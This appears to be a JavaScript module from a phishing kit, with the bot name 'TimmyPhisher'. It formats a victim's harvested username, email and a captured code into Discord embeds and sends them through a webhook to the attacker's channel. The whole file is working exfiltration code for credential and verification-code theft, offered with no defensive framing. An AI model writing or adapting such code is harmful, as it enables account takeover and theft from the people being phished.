const axios = require('axios')
const { WebhookClient } = require('discord.js');
import ('node-fetch')

const customAvatarURL = 'https://bigrat.monster/media/bigrat.jpg';
const customUsername = 'TimmyPhisher';

async function discordEmbed (username, email) {
  const discordMessage = {
    username: customUsername,
    avatarURL: customAvatarURL,
    content: `@everyone`,
    embeds: [
      {
        color: 16746496,
        timestamp: new Date().toISOString(),
        fields: [
          {
            name: '**Username:**',
            value: '```' + username + '```',
            inline: true,
          },
          {
            name: '**Email:**',
            value: '```' + email + '```',
            inline: true,
          },
        ],
        footer: {
          text: 'by timmy',
      },
      },
    ],
  };
  return discordMessage
}

async function discordEmbed2 (username, email, code) {
  const discordMessage = {
    username: customUsername,
    avatarURL: customAvatarURL,
    content: `@everyone`,
    embeds: [
      {
        color: 16746496,
        timestamp: new Date().toISOString(),
        fields: [
          {
            name: '**Username:**',
            value: '```' + username + '```',
            inline: true,
          },
          {
            name: '**Email:**',
            value: '```' + email + '```',
            inline: true,
          },
          {
            name: '**Code:**',
            value: '```'+ code +'```',
          },
        ],
        footer: {
          text: 'by timmy',
      },
      },
    ],
  };
  return discordMessage
}

async function sendDiscordMessage(username, email) {
  try {
    const messageContent = await discordEmbed(username, email);
    const { webhookUrl } = require('./config.json');

    if (!webhookUrl) {
      console.error('Webhook URL not found or invalid.');
      return { error: 'Webhook URL not found or invalid' };
    }

    const webhookClient = new WebhookClient({
      url: webhookUrl,
    });
    
    await webhookClient.send(messageContent);
    console.log(`Sent the message`);
    return { success: true };
  } catch (error) {
    console.error('Error sending Discord message:', error.message);
    return { error: 'Failed to send Discord message' };
  }
}

async function sendDiscordMessage2(username, email, code) {
    try {
      const messageContent = await discordEmbed2(username, email, code);
      const { webhookUrl } = require('./config.json');
  
      if (!webhookUrl) {
        console.error('Webhook URL not found or invalid.');
        return { error: 'Webhook URL not found or invalid' };
      }
  
      const webhookClient = new WebhookClient({
        url: webhookUrl,
      });
      
      await webhookClient.send(messageContent);
      console.log(`Sent the message`);
      return { success: true };
    } catch (error) {
      console.error('Error sending Discord message:', error.message);
      return { error: 'Failed to send Discord message' };
    }
  }

module.exports = { sendDiscordMessage, sendDiscordMessage2 };
